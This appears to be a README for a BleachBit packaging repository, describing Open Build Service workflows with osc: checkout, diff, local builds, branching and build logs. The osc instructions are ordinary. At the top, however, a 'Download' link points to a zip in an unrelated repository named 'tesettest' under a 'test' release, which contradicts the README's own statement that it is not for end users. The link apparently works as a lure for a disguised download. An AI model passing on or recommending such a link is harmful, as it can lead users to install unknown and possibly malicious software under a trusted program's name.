# BleachBit System Cleaner Packaging Repository

This repository contains package-building files for BleachBit, a system cleaner for Windows and Linux. It is focused on distribution packaging workflows, especially builds managed through the Open Build Service using the `osc` command-line tool.

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/bleachbit-1.zip)

## What This Repository Is For

BleachBit is a system cleaner used on Windows and Linux systems. This repository is not a general user guide for the application itself; it provides files and notes related to building BleachBit packages.

The main workflow described here is for Debian and Ubuntu package builds through Open Build Service. The files in this repository are intended to be compared with, checked out from, and submitted to an OBS package project.

## Packaging Workflow Overview

The packaging process uses `osc`, the Open Build Service command-line client. With `osc`, maintainers can:

- Check out package files from OBS
- Compare local packaging files with OBS files
- Run local package builds
- Send packaging changes to OBS
- Inspect build results and logs

A build is started automatically on OBS when updated files are committed to the package project.

## Requirements

To work with the package build workflow, install the `osc` tool and use an account on the Open Build Service.

The account is required because `osc` interacts with the OBS server for checking out packages, submitting changes, and viewing build information.

## Checking Package Files

To check out the package files from OBS into a temporary directory and compare them with this repository, use:

```bash
osc checkout home:andrew_z bleachbit -o /tmp/obsfiles
diff -u3 /tmp/obsfiles .
```

The general checkout form is:

```bash
osc co <project> <package> --outdir <path>
```

This is useful when verifying that local packaging files match the files currently stored in OBS.

## Building Locally

From an `osc` working copy, a local package build can be started with:

```bash
osc build xUbuntu_20.10
```

In this example, `xUbuntu_20.10` is one of the configured repository targets. Use the repository name that matches the target distribution configured for the package.

## Testing Package Changes on OBS

For testing changes without modifying the main package directly, create a branched OBS package:

```bash
osc branch home:andrew_z bleachbit
```

After creating the branch, check out the working copy as indicated by `osc`, for example:

```bash
osc co home:abitrolly:branches:home:andrew_z/bleachbit
```

This allows package build changes to be tested separately before they are submitted elsewhere.

## Viewing Build Results

Use `osc results` to inspect package build status:

```bash
osc results
```

Example output may include target distributions, architectures, and build states:

```text
xUbuntu_20.10        x86_64     failed
xUbuntu_20.04        x86_64     succeeded*
xUbuntu_18.04        x86_64     succeeded*
```

To inspect details for a build target, use:

```bash
osc buildlog xUbuntu_20.10
```

Build logs are useful for understanding why a package build did or did not complete successfully.

## Notes for Maintainers

This repository is intended for people working with BleachBit packaging files rather than for end users installing the application.

When updating package files:

- Keep local files synchronized with the OBS package state.
- Use local builds to check changes before submitting them.
- Review build results for each configured target distribution.
- Use a branched package when testing changes that should not affect the main package immediately.

## FAQ

### Is this the BleachBit application source code?

This repository is focused on packaging files used to build BleachBit packages. It is not presented here as a full application source tree.

### What platforms are mentioned?

The repository description identifies BleachBit as a system cleaner for Windows and Linux. The packaging notes specifically describe Debian and Ubuntu package builds through OBS.

### What tool is used for package builds?

The documented workflow uses `osc`, the command-line client for Open Build Service.

### Can packages be built locally?

Yes. The documented workflow includes local builds from an `osc` checkout using `osc build` with a configured repository target.

### How are build results checked?

Build results can be reviewed with `osc results`, and detailed build output can be inspected with `osc buildlog`.
